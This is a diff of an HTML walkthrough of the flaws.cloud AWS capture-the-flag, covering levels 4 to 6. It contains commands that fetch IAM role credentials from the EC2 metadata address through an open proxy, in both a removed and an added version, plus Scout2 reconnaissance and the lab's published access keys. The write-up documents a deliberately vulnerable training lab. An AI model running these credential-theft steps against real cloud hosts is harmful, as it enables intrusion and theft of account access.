-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+<span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> head -n1 <span class="p">|</span> cut -d. -f2<span class="k">)</span>
 <span class="nv">HACKER</span><span class="o">=</span>hacker
 <span class="nv">LEVEL4</span><span class="o">=</span>level4
 <span class="nv">SG</span><span class="o">=</span><span class="nv">$LEVEL4</span>-sg
-<span class="nv">KEYNAME</span><span class="o">=</span><span class="nv">$LEVEL4</span>-key
-<span class="nv">VMNAME</span><span class="o">=</span><span class="nv">$LEVEL4</span>
-<span class="hll"><span class="nv">INSTANCE</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> ec2 describe-instances <span class="se">\</span>
+<span class="hll"><span class="nv">VMNAME</span><span class="o">=</span><span class="nv">$LEVEL4</span>
+</span><span class="hll"><span class="nv">INSTANCE</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> ec2 describe-instances <span class="se">\</span>
 </span><span class="hll">               --filters <span class="s2">&quot;Name=tag:Name,Values=</span><span class="nv">$VMNAME</span><span class="s2">&quot;</span> <span class="se">\</span>
 </span><span class="hll">               --query <span class="s1">&#39;Reservations[*].Instances[*].InstanceId&#39;</span> <span class="se">\</span>
 </span><span class="hll">               --output text <span class="se">\</span>
 </span><span class="hll"><span class="k">)</span>
 </span><span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
 </span><span class="hll">  ec2 terminate-instances --instance-ids <span class="nv">$INSTANCE</span>
-</span><span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
-</span><span class="hll">  ec2 delete-key-pair --key-name <span class="nv">$KEYNAME</span>
-</span><span class="hll">rm <span class="nv">$KEYNAME</span>.pem
 </span><span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
 </span><span class="hll">  ec2 delete-security-group --group-name <span class="nv">$SG</span>
 </span></pre></div>
@@ -725,43 +795,26 @@ chmod <span class="m">600</span> <span class="nv">$KEYNAME</span>.pem
 <h2>3.2.6. <a class="reference external" href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">flaws.cloud Level 5</a><a class="headerlink" href="#id26" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="level-5-aws-background">
 <h3>3.2.6.1. Level 5 AWS background<a class="headerlink" href="#level-5-aws-background" title="Permalink to this headline">¶</a></h3>
-<p>This exploit hinges on using <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">AWS EC2 - Instance Metadata and User Data</a>. Specifically, if a host allows access to <a class="reference external" href="http://169.254.169.254">http://169.254.169.254</a> then critical security information can be leaked. For retrieving and using credentials see <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html#instance-metadata-security-credentials">AWS EC2 - Retrieving Security Credentials from Instance Metadata</a>, <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html#using-temp-creds-sdk-cli">AWS IAM - Using Temporary Security Credentials with the AWS CLI</a>, and <a class="reference external" href="https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html">AWS CLI - Configuring the AWS CLI</a>. Here’s an example:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Get the creds</span>
-<span class="nv">ROLE</span><span class="o">=</span>some-role
-<span class="hll">curl --silent http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="nv">$ROLE</span>/ <span class="se">\</span>
-</span><span class="hll">  <span class="p">|</span> tee creds.json
-</span><span class="nv">AK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.AccessKeyId&#39;</span> creds.json<span class="k">)</span>
-<span class="nv">SAK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.SecretAccessKey&#39;</span> creds.json<span class="k">)</span>
-<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.Token&#39;</span> creds.json<span class="k">)</span>
-
-<span class="hll"><span class="c1"># Use the creds</span>
-</span><span class="o">(</span>
-<span class="nb">export</span> <span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$AK</span><span class="s2">&quot;</span>
-<span class="nb">export</span> <span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SAK</span><span class="s2">&quot;</span>
-<span class="nb">export</span> <span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span>
-aws --region us-west-2 ec2 describe-instances
-<span class="o">)</span>
-
-<span class="hll"><span class="c1"># Create a profile</span>
-</span><span class="nv">HACKER</span><span class="o">=</span>myprofile
-<span class="nv">REGION</span><span class="o">=</span>us-west-2
-cat <span class="s">&lt;&lt;EOF | aws configure --profile $HACKER</span>
-<span class="s">$AK</span>
-<span class="s">$SAK</span>
-<span class="s">$REGION</span>
-<span class="s">json</span>
-<span class="s">EOF</span>
-aws --profile <span class="nv">$HACKER</span> configure <span class="nb">set</span> aws_session_token <span class="s2">&quot;</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span>
-
-<span class="hll"><span class="c1"># Use the profile</span>
-</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> ec2 describe-instances
-</pre></div>
+<p>This exploit hinges on using <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">AWS EC2 - Instance Metadata and User Data</a>. Specifically, <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2.html">AWS IAM - Using an IAM Role to Grant Permissions to Applications Running on Amazon EC2 Instances</a> following <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html#instance-metadata-security-credentials">AWS EC2 - Retrieving Security Credentials from Instance Metadata</a> to retrieve security credentials for an IAM role (here named s3access):</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+</span></pre></div>
 </div>
+<p>By design, applications running on an EC2 instance retrieve their credentials from the local instance metadata availalble via <a class="reference external" href="http://169.254.169.254/">http://169.254.169.254/</a>. That same article warns:</p>
+<blockquote>
+<div><p><strong>Warning</strong></p>
+<p>If you use services that use instance metadata with IAM roles, ensure that you don’t expose your credentials when the services make HTTP calls on your behalf. The types of services that could expose your credentials include HTTP proxies, HTML/CSS validator services, and XML processors that support XML inclusion.</p>
+</div></blockquote>
+<p>And Level 5 provides an HTTP proxy allowing access to <a class="reference external" href="http://169.254.169.254/">http://169.254.169.254/</a> and therefore access to role credentials. For more information see <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html#using-temp-creds-sdk-cli">AWS IAM - Using Temporary Security Credentials with the AWS CLI</a> and <a class="reference external" href="https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html">AWS CLI - Configuring the AWS CLI</a>. Note that a token is required in addition to the usual access key and secret access key.</p>
 </div>
 <div class="section" id="exploit-the-proxy-to-get-meta-data">
 <h3>3.2.6.2. Exploit the proxy to get meta-data<a class="headerlink" href="#exploit-the-proxy-to-get-meta-data" title="Permalink to this headline">¶</a></h3>
 <p>The proxy not restricting IPs allows fetching instance metadata, leading to a credentials leak, resulting in the goal of listing the contents of the level 6 bucket.</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL5</span><span class="o">=</span>level5
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+<span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+
+<span class="nv">LEVEL5</span><span class="o">=</span>level5
 <span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> head -n1 <span class="p">|</span> cut -d. -f2<span class="k">)</span>
@@ -827,7 +880,12 @@ aws --profile <span class="nv">$LEVEL5</span> configure <span class="nb">set</sp
 <div class="section" id="exploit-securityaudit-policy">
 <h3>3.2.7.2. Exploit SecurityAudit policy<a class="headerlink" href="#exploit-securityaudit-policy" title="Permalink to this headline">¶</a></h3>
 <p>Level 6 provides <em>Access key ID: AKIAJFQ6E7BY57Q3OBGA</em> and <em>Secret: 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</em> with the SecurityAudit policy.</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL6</span><span class="o">=</span>level6
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+<span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+
+<span class="nv">LEVEL6</span><span class="o">=</span>level6
 <span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
@@ -844,9 +902,19 @@ cat <span class="s">&lt;&lt;EOF | aws configure --profile $LEVEL6</span>
 <span class="s">json</span>
 <span class="s">EOF</span>
 
-<span class="hll"><span class="c1"># Scout2 for reconnaissance</span>
+<span class="hll"><span class="c1"># Scout2 ignores AWS_CONFIG_FILE and AWS_SHARED_CREDENTIALS_FILE</span>
+</span><span class="o">(</span>
+  <span class="nb">cd</span> ~/.aws <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  mv config config.bak <span class="o">&amp;&amp;</span> cp <span class="nv">$AWS_CONFIG_FILE</span> config <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  mv credentials credentials.bak <span class="o">&amp;&amp;</span> cp <span class="nv">$AWS_SHARED_CREDENTIALS_FILE</span> credentials
+<span class="o">)</span>
+<span class="hll"><span class="c1"># Scount2 for reconnaissance</span>
 </span><span class="hll">Scout2 --profile <span class="nv">$LEVEL6</span> --region <span class="nv">$REGION</span> --report-dir scout2-<span class="nv">$LEVEL6</span>
-</span><span class="hll"><span class="o">(</span><span class="nb">cd</span> scout2-<span class="nv">$LEVEL6</span><span class="p">;</span> python3 -m http.server <span class="m">8080</span><span class="o">)</span>
+</span><span class="o">(</span>
+   <span class="nb">cd</span> ~/.aws <span class="o">&amp;&amp;</span> <span class="se">\</span>
+   mv config.bak config <span class="o">&amp;&amp;</span> mv credentials.bak credentials
+<span class="o">)</span>
+<span class="hll"><span class="o">(</span><span class="nb">cd</span> scout2-<span class="nv">$LEVEL6</span><span class="p">;</span> python3 -m http.server <span class="m">8080</span><span class="o">)</span>
 </span><span class="hll"><span class="c1"># Browse report ...</span>
 </span>
 <span class="hll"><span class="c1"># For detailed information:</span>
@@ -908,7 +976,7 @@ aws --profile <span class="nv">$LEVEL6</span> --region <span class="nv">$REGION<
 </div>
 <div class="section" id="cleaning-up">
 <h2>3.2.8. Cleaning Up<a class="headerlink" href="#cleaning-up" title="Permalink to this headline">¶</a></h2>
-<p>Follow the instructions above to <a class="reference internal" href="#flaws-delete-instance"><span class="std std-ref">delete the EC2 instance</span></a>, followed by <a class="reference internal" href="#flaws-delete-user"><span class="std std-ref">delete the $HACKER user &amp; SSH keys</span></a>, then manually clean up the added profiles in <code class="file docutils literal notranslate"><span class="pre">~/.aws/config</span></code> and <code class="file docutils literal notranslate"><span class="pre">~/.aws/credentials</span></code>.</p>
+<p>Follow the instructions above to <a class="reference internal" href="#flaws-delete-instance"><span class="std std-ref">delete the EC2 instance</span></a>, followed by <a class="reference internal" href="#flaws-delete-user"><span class="std std-ref">delete the $HACKER user, SSH keys, and AWS profiles</span></a>.</p>
 </div>
 </div>
 
